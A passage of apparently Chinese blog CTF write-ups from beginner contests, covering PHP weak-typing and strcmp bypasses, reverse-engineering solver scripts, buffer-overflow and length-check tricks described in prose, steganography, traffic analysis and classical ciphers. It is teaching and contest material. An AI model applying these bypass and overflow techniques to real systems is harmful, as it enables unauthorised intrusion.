这个题的考点就是PHP弱类型中0==string这个情况（PHP混乱邪恶无疑就是要让json_decode出来的结果是0，于是在沙盒http://sandbox.onlinephpfunctions[.]com/里实验出了结果然后去原网页的时候还失败了一次……因为传入的时候会再加对引号……这里必须感谢一下飘零大大指点的，一开始光想着怎么绕过正则，反而偏离了正轨顺便正则的效果大概是需要传入的字符串既有数字又有字母长度大于6就行 can u find me? Descriptiononly robot know where is the flag 那当然是robots.txt啦，这不是送？直接访问看到抓包看看，发现Cookie里有个user=补上，发出，得flag tell me what you want这个题就是纯练改HTTP头的点进去问你想要啥，你输flag告诉你用POST更好，然后之后每改一次都会告诉你新的要改的地方，全改完得到flag 我们不一样还是源码放出，还是弱类型12345678910include_once("flag.php");if (isset($_POST['str1']) &amp;&amp; isset($_POST['str2'])) &#123; if ($_POST['str1'] != $_POST['str2'] &amp;&amp; strcmp($_POST['str1'], $_POST['str2']) == 0) &#123; echo "flag is:".$flag; exit(); &#125; else &#123; echo "Something wrong.."; &#125;&#125; 这里的弱类型在于string和非string的strcmp返回0，而array!=string成立 Revre0拖进IDA，F5出flag baby_crack拖进IDA，F5，读代码。发现对操作做了这样的操作： 按位置进行循环移位 将输入的每个通过一个映射转到另一个 进行几轮交换 与flag进行同意操作得到的结果进行比较于是写出反着来的操作1234567891011121314151617181920//baby1.cpp#include &lt;bits/stdc++.h&gt;using namespace std;int indx[]=&#123;17,191,186,15,213,204,188,30,25,1,135,27,150,195,134,26,126,107,90,141,251,194,139,179,177,221,239,10,75,248,85,38,118,171,193,100,23,201,175,97,103,74,202,18,36,225,174,80,58,112,55,237,224,119,183,46,161,45,50,123,137,207,240,148,33,101,11,63,125,41,59,5,81,231,129,110,51,198,215,172,60,154,34,220,122,8,106,151,241,95,142,98,111,19,138,130,140,42,73,57,24,104,208,131,180,66,54,113,12,87,16,243,40,212,52,14,228,255,6,173,92,252,219,222,218,159,234,53,94,120,82,217,79,109,187,168,176,21,67,144,37,166,84,254,13,235,169,253,233,93,22,203,47,78,189,197,9,70,247,192,31,89,211,2,35,157,96,4,132,246,164,29,49,76,200,155,199,223,102,44,236,121,115,48,105,99,149,214,190,68,232,165,242,153,216,56,160,227,143,210,83,61,86,146,114,250,184,167,205,238,147,133,108,127,170,178,71,206,128,32,28,124,7,226,185,145,69,116,152,245,62,3,196,65,1,43,72,39,230,91,244,156,136,117,162,182,20,209,229,77,64,249,158,88,163&#125;;int arr[]=&#123;166,78,5,162,182,8,162,206,140,238,32,194,152,160,208,205,35,166,106,130&#125;;int main()&#123;// int a;// while(cin&gt;&gt;a)&#123;// cout&lt;&lt;indx[a]&lt;&lt;endl;// &#125; for(int i=0;i&lt;20;++i)&#123; for(int j=0;j&lt;256;++j)&#123; if(indx[j]==arr[i])&#123; cout&lt;&lt;int(*(char*)(&amp;j))&lt;&lt;','; &#125; &#125; &#125; return 0;&#125; 12345678910111213141516171819202122//baby2.cpp#include &lt;bits/stdc++.h&gt;using namespace std;int arr[]=&#123;141,153,71,245,246,85,245,217,96,209,219,21,228,196,102,208,164,141,86,95&#125;;int main()&#123;// for(int i=0;i&lt;20;++i)&#123;// newa[indx[i]]=arr[i];// &#125;// for(int i=0;i&lt;20;++i)&#123;// cout&lt;&lt;newa[i]&lt;&lt;',';// &#125; swap(arr[10],arr[15]); swap(arr[10],arr[6]); swap(arr[6],arr[3]); swap(arr[3],arr[1]); swap(arr[0],arr[1]); for(int i=0;i&lt;20;++i)&#123; printf("%d,",arr[i]); &#125; return 0;&#125; 1234567891011121314151617181920212223242526//baby3.cpp#include &lt;bits/stdc++.h&gt;using namespace std;uint8_t arr[]=&#123;208,141,71,153,246,85,245,217,96,209,245,21,228,196,102,219,164,141,86,95&#125;;unsigned char flg[22]="";int main()&#123; for(int i=0;i&lt;20;++i)&#123; bitset&lt;8&gt; a(arr[i]); cout&lt;&lt;a&lt;&lt;endl; if(i%4==1)&#123; a=(a&lt;&lt;6)|(a&gt;&gt;2); &#125;else if(i%4==2)&#123; a=(a&gt;&gt;4)|(a&lt;&lt;4); &#125;else if(i%4==3)&#123; a=(a&lt;&lt;2)|(a&gt;&gt;6); &#125;else&#123; a=(a&gt;&gt;1)|(a&lt;&lt;7); &#125; cout&lt;&lt;a&lt;&lt;' '&lt;&lt;a.to_ulong()&lt;&lt;endl; flg[i]=a.to_ulong(); &#125; for(int i=0;i&lt;20;++i)&#123; cout&lt;&lt;char(flg[i]); &#125;&#125; 这里需要说一下……C/C++的左右移有毒！换bitset保平安！ nop_pop一月霸权当然是我pop team epic啦！食我粪作！EXEinfo显示是PE文件，那就运行一下看打开OD搜一下先是把跳转nop掉，然后出来那个Con...的，联系出题人，出题人表示是要nop掉pop子于是再看，然后发现上面有个nop_me（提示真明显wwwww）nop掉，程序发给出题人，得到flag sc2_player看了一下程序F5出来的东西大概做了这几步操作 arr=(index%7+35)^special special(index%7)=special^0x34 arr=input^ index^(index/7)这几个都是长度为28的数组，arr是最后用来比对的数组，input是输入的flag，special是一个程序存储的数组所以前两步有什么意义……12345678910111213//sc2.cpp#include &lt;bits/stdc++.h&gt;using namespace std;char arr[29]=&#123;104,98,118,101,127,72,50,127,86,124,99,63,82,101,72,108,77,116,101,32,114,115,74,96,115,127,124,101&#125;;int main()&#123; for(int i=0;i&lt;28;++i)&#123; arr[i]=arr[i]^i^(i/7); &#125; for(int i=0;i&lt;28;++i)&#123; putchar(arr[i]); &#125;&#125; PWN前两题做的时候不在家，借朋友电脑用了下 guess_number其实是很明显的溢出，scanf这个东西不安全，可以直接覆盖到比较的数字 flag_server还是输入超限，不过一开始要输入长度而且还不能大于63，后面的对比又用!=（继续吐槽我那个超喜欢用!=的队友所以输入一个负数就好了然后就可以覆盖到猜测的数字了 zazahui先看整个流程，发现它先把flag读进了一个固定地址这次换成了read，但是大小却是188，于是还是能搞事，直接用地址覆盖后面的*s就能输出flag了本机测试过关直接发payload了，顺便*s后面是计数器，所以可以覆盖可以不覆盖，但是不能改成0，那样就直接退出了 Misc白菜1先用stegsolver打开看了一遍，都没东西于是考虑lsb（算是常规套路了吧）然后文件头不熟练的我还跑了下binwalk,wwwwwww就是个zip包，解压出来就是flag 白菜2跑一下binwalk，发现有东西然后就得到了flag pacp1搜下flag看最后这个返回200的分组 Crypto知识点全部给出来了哇，真系给力 easy Caesar一开始题目还有错，于是找出题人说，拿到了1血（然而改错没加分wwww）直接上工具然后数字也有变过，那么按照常识判断，就是qu1ck,4x,la2y,br0wn于是有了flag Polybius看到的时候就反应过来了，可惜当时没找到工具手解的……看它给的提示网址https://www.wikiwand[.]com/en/Polybius#/Cryptography就行了，这种出题真的很照顾人了 Hill学到了一种新的加密方式，不过要算数论中矩阵的逆，如果阶数高了，感觉就是灾难啊……顺便我又没找到工具一开始还没仔细看链接，矩阵的逆还是手算的……淦了同样的https://www.wikiwand[.]com/en/Hill_cipher confusion这个题就比较舒服，不就是大杂烩嘛，上工具~ baby step刚学完密码学，然而不想自己手写网上直接找的python脚本太腊鸡了……慢得不行最后换ACM大佬博客找的就好了解出来基础解是191091022097，然后加上i个0x1111111111模0x976693344d的逆元就好，顺便后面这个数是质数，所以逆元可以用费马小定理算]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Misc</tag>
        <tag>PWN</tag>
        <tag>Web</tag>
        <tag>Rev</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HIT2018新生赛部分WP]]></title>
    <url>%2FHIT2018%E6%96%B0%E7%94%9F%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[只会写水题，要好好学习了 Baby Android安卓逆向助手打开，发现就是异或，两个字符串摘一下异或一下得到flag Easy_XOR发现出题人拿同一个密钥加密了两个文件，而且还有一份明文，直接异或得到flag（所以感觉这个是不是没考中考点？） HITCTF 2018签到不会翻墙学个P的计算机呀，翻墙搜索看视频得到flag BaSO4就是base64/32混合嘛，其实这种混合的一般来说很好解，因为 Base64中有[0-9a-zA-Z+/=] Base32中有[A-Z2-7=] Base16中有[0-9A-F] 于是拿出以前写的脚本手动选择跑一下（等有空改成自动的） 攻击流量分析看前面就是尝试找flag未遂，一堆404，拖到最后终于看到200。 把数据保存下来跑一边gzuncompress就好 我是用在线工具搞得，所以为了复制不可见字符先base64一下咯 键盘流量分析首先用命令 1tshark -r keyboard.pcap -T field -e usb.capdata &gt; usbdata.txt 把按键数据抓出来 然后发现只有中间的是8字节的键盘数据，反正也不多就干脆看着敲出来了 用第三个字节查表，首字节的02表示上档键，这个不知道也可以猜出来 use_your_ida（时间到以后突然想到）时间到以后群友一说距离视图突然反应过来…… 给大佬递IDA.jpg…… 算是一种隐写吧，大概]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Misc</tag>
        <tag>Rev</tag>
      </tags>
  </entry>
</search>
